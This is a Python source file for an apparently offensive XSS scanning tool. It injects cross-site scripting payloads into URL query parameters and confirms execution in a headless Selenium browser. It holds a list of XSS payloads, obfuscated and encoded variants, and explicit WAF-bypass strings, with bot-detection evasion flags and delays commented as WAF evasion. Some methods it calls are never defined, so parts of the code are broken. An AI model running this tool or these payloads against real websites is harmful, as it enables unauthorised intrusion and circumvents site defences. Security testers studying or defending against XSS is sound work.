import requests
import urllib.parse
import base64
import re
import time
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.alert import Alert
from webdriver_manager.chrome import ChromeDriverManager

from core.payloads import get_payloads_by_context, generate_encoded_payloads, detect_context

init(autoreset=True)

class PayloadManager:
    def __init__(self, headers=None, proxy=None, timeout=5, retries=2, batch_size=10):
        self.headers = headers or {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.timeout = timeout
        self.retries = retries
        self.batch_size = batch_size
        
        self.normal_payloads = [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<div onmouseover=alert(1)>Hover over me</div>',
            '<input onfocus=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<video oncanplaythrough=alert(1)><source src="x">',
            '<marquee onstart=alert(1)>XSS</marquee>',
            'straw"><img src=a onerror=alert(1)>hat',
        ]

    def analyze_reflections_and_generate_payloads(self, filtered_urls):
        """Sends test values, analyzes reflections, and generates payloads."""
        print(f"{Fore.CYAN}[⚡] Fetching Responses to Detect Context...{Style.RESET_ALL}\n")

        url_reflections = {}  # Store reflections count for each URL
        url_responses = {}  # Store valid responses for payload generation

        for url in filtered_urls:
            test_url = self.construct_test_url(url)
            response = self.send_request(test_url)

            if response:
                # Count occurrences of `Strawhat` in response (Reflections)
                reflection_count = len(re.findall(r"Strawhat", response.text, re.IGNORECASE))
                url_reflections[url] = reflection_count
                url_responses[url] = response.text  # Store response for later payload generation

                print(f"{Fore.GREEN} [✔] Reflections for {url + 'Strawhat'} : {reflection_count}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[❌] Request Failed for {url + 'Strawhat'}. Please check the URL or parameters.{Style.RESET_ALL}")

        if not url_reflections:
            print(f"{Fore.RED}[❌] No reflections found. Attempting alternate payloads...")
            return self.generate_all_payloads()

        # Generate payloads only for URLs with reflections
        print(f"\n{Fore.CYAN}[⚡] Generating Payloads...{Style.RESET_ALL}")
        payloads_per_url = {
            url: self.generate_dynamic_payloads(url_responses[url])
            for url in url_reflections
        }
    
        if not any(payloads_per_url.values()):
            print(f"{Fore.RED}[ERROR] No payloads generated for any URL. XSS testing cannot proceed.{Style.RESET_ALL}")
            return {}

        total_payloads = sum(len(payloads) for payloads in payloads_per_url.values())
        print(f"{Fore.CYAN} [⚡] Payloads Generated: {total_payloads}{Style.RESET_ALL}")

        return payloads_per_url
    
    def generate_dynamic_payloads(self, response_text):
        payloads_by_context = get_payloads_by_context()  
        context = detect_context(response_text)

        if context in payloads_by_context:
            selected_payloads = payloads_by_context[context]
        else:
            print(f"{Fore.YELLOW} [⚠] No specific payloads found for `{context}`, using default HTML payloads.{Style.RESET_ALL}")
            selected_payloads = payloads_by_context.get("html", [])

        if not selected_payloads:
            print(f"{Fore.RED}[ERROR] No payloads available for context `{context}`{Style.RESET_ALL}")
            return []

        encoded_payloads = generate_encoded_payloads(selected_payloads)
        html_escaped = [p.replace("<", "&lt;").replace(">", "&gt;") for p in selected_payloads]
        url_encoded = [urllib.parse.quote(p) for p in selected_payloads]

        obfuscated_payloads = [
            p.replace("alert", "a\\lert") for p in selected_payloads
        ] + [
            p.replace("alert", "window['ale'+'rt']") for p in selected_payloads
        ]
        base64_encoded = [base64.b64encode(p.encode()).decode() for p in selected_payloads]

        mutated_payloads = []
        for payload in selected_payloads:
            mutated_payloads.append(payload[::-1])  # Reverse
            mutated_payloads.append(payload.upper())  # Uppercase
            mutated_payloads.append(payload.lower())  # Lowercase
            mutated_payloads.append(payload.replace("=", "%3D").replace("\"", "'"))  # Symbol change

        waf_bypass = [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<svg><script>alert(1)</script></svg>",
            "'\"`><svg onload=alert(1)>"
        ]

        all_payloads = (
            self.normal_payloads + 
            encoded_payloads + html_escaped + url_encoded +
            obfuscated_payloads + base64_encoded +
            mutated_payloads +
            waf_bypass
        )

        return list(set(all_payloads))[:1000]

    def generate_all_payloads(self):
        """Generates all available payloads if no context is detected."""
        all_payloads = []
        payloads_by_context = get_payloads_by_context()
        for context_payloads in payloads_by_context.values():
            all_payloads.extend(context_payloads)
        return all_payloads + generate_encoded_payloads(all_payloads)
    
    def construct_payload_url(self, url, payload):
        """Injects a payload into empty query parameters in the given URL."""
        if not url or not isinstance(url, str):
            print(f"{Fore.RED}[DEBUG] Invalid URL received in construct_payload_url: {url}{Style.RESET_ALL}")
            return None  # Return None to indicate failure

        parsed_url = urllib.parse.urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            return None
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)

        if not query_params:
            print(f"{Fore.YELLOW}[DEBUG] No query parameters in URL: {url}. Returning as is.{Style.RESET_ALL}")
            return url  # No parameters to inject into, return original

        for key, value in query_params.items():
            if value == [""]:  # ✅ Only replace empty values
                query_params[key] = [payload]

        new_query_string = urllib.parse.urlencode(query_params, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_string,
            parsed_url.fragment
        ))
        return new_url

    def construct_test_url(self, url):
        """Constructs a test URL with a test parameter."""
        test_url = self.construct_payload_url(url, "Strawhat")

        if not test_url:
            print(f"{Fore.RED}[DEBUG] construct_test_url() returned None for: {url}{Style.RESET_ALL}")

        return test_url
       
    def send_request(self, url):
        """Sends a GET request to the specified URL and returns the response."""
        try:
            response = requests.get(url, headers=self.headers, proxies=self.proxy, timeout=self.timeout)
            if response.status_code == 200:
                return response
            else:
                # Check for WAF-related issues
                if self.is_waf_related_issue(response.status_code):
                    print(f"{Fore.YELLOW}[⚠] WAF Detected for {url} (Status {response.status_code}). Generating bypass payloads...{Style.RESET_ALL}")
                    self.generate_bypass_payloads(url)
                else:
                    print(f"{Fore.YELLOW}[⚠] Unexpected Response ({response.status_code}): {url}{Style.RESET_ALL}")
                return None
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[❌] Request Failed: {url} → {e}{Style.RESET_ALL}")
            return None

    def is_waf_related_issue(self, status_code):
        """Determines if the response status code indicates a WAF issue."""
        return status_code in [403, 406, 429]  # Common WAF-related status codes

    def process_payloads(self, urls, payloads_per_url):
        """Processes payloads in batches for efficiency."""
        if not urls:
            print(f"{Fore.RED}[❌] No URLs provided for payload injection.{Style.RESET_ALL}")
            return

        print(f"\n{Fore.CYAN}[⚡] Injecting Payloads into Filtered URLs...{Style.RESET_ALL}")

        total_tests = sum(len(payloads) for payloads in payloads_per_url.values())
        processed_tests = 0

        with ThreadPoolExecutor(max_workers=2) as executor:
            futures = [
                executor.submit(self.send_batch_payloads, url, payloads)
                for url, payloads in payloads_per_url.items()
            ]

            for future in as_completed(futures):
                processed_tests += 1
                future.result()

        print(f"\n{Fore.GREEN} [✔] Dynamic XSS Testing Completed!{Style.RESET_ALL}")

    def test_xss_with_browser(self, url, payload):
        """Uses Selenium to check if the payload executes AND is visible in the browser."""

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")  # ✅ Run in headless mode (no UI)
        options.add_argument("--disable-blink-features=AutomationControlled")  # ✅ Evade bot detection
        options.add_argument("--no-sandbox")  # ✅ Avoid permission issues
        options.add_argument("--disable-dev-shm-usage")  # ✅ Prevent crashes
        options.add_argument("--incognito")  # ✅ Use incognito mode to prevent caching
        options.add_argument("--disable-popup-blocking")  # ✅ Ensure alerts are not blocked

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.set_page_load_timeout(10)  # ✅ Prevent infinite loading

        try:
            full_url = self.construct_payload_url(url, payload)    
            driver.get(full_url)  # ✅ Load the URL in a real browser

            # ✅ Initial State
            alert_detected = False
            dom_changed = False
            payload_visible = False
            processed_by_browser = False
            
            # ✅ 1. Check if an alert box appears (confirms execution)
            try:
                Alert(driver).accept()
                alert_detected = True
            except:
                pass

            # ✅ 2. Check if the DOM is modified (script injection, onerror, onclick)
            dom_elements = ['<script>', 'onerror', 'eval(', 'onclick']
            dom_changed = any(tag in driver.page_source.lower() for tag in dom_elements)

            # ✅ 3. Check if payload is **visible in the page** (Final Confirmation)
            def is_payload_visible(driver, payload):
                try:
                    # Check if the payload text appears somewhere on the webpage
                    return payload in driver.find_element("tag name", "body").text
                except:
                    return False
                        
            payload_visible = is_payload_visible(driver, payload)

            try:
                browser_exec_test = driver.execute_script("return document.readyState;")
                processed_by_browser = browser_exec_test == "complete"  # ✅ Ensures full execution
            except:
                pass
        
            # ✅ XSS is confirmed ONLY IF **JavaScript executes AND is visible**
            xss_confirmed = alert_detected or (processed_by_browser and dom_changed and payload_visible)

            # ✅ Improved Output
            print("\n────────────────────────────────")
            print(f"{Fore.YELLOW}XSS Test for:{Style.RESET_ALL} {full_url}")
            print(f"{Fore.RED}JavaScript Executed:{Style.RESET_ALL} {'Yes ✅' if alert_detected else 'No ❌'}")
            print(f"{Fore.GREEN}DOM Modified:{Style.RESET_ALL} {'Yes ✅' if dom_changed else 'No ❌'}")
            print(f"{Fore.BLUE}Payload Visible in Browser:{Style.RESET_ALL} {'Yes ✅' if payload_visible else 'No ❌'}")
            print(f"{Fore.MAGENTA}Processed by Browser:{Style.RESET_ALL} {'Yes ✅' if processed_by_browser else 'No ❌'}")
            print(f"{Fore.CYAN}XSS Confirmed:{Style.RESET_ALL} {'Yes ✅' if xss_confirmed else 'No ❌'}")

            return xss_confirmed  # ✅ Only return True if XSS is executed **AND** visible in the browser

        except Exception as e:
            return False  # Assume no XSS execution if an error occurs

        finally:
            driver.quit()
            
    def print_confirmed_xss_payloads(self):
        """Prints all confirmed XSS payloads at the end of the testing process."""
        if self.confirmed_xss_payloads:
            print(f"\n{Fore.GREEN}[✔] Confirmed XSS Payloads:")
            for payload in self.confirmed_xss_payloads:
                print(f"{Fore.YELLOW} - {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✘] No confirmed XSS payloads found.{Style.RESET_ALL}")
        
    def send_batch_payloads(self, url, payloads):
        """Sends multiple payloads and verifies execution using Selenium."""
        try:
            for payload in payloads:
                time.sleep(1.5)  # ✅ Random delay for WAF evasion
                full_url = self.construct_payload_url(url, payload)

                response = requests.get(full_url, headers=self.headers, proxies=self.proxy, timeout=self.timeout)
                response_text = response.text.lower()

                # ✅ Check for Reflection First
                reflected = re.search(re.escape(payload), response_text, re.IGNORECASE) is not None

                # ✅ Run Selenium Test to Confirm Execution
                executed = self.test_xss_with_browser(url, payload)

        except requests.exceptions.RequestException as e:
            # print(f"{Fore.RED}[❌] Request Failed: {url} → {e}{Style.RESET_ALL}")
            pass
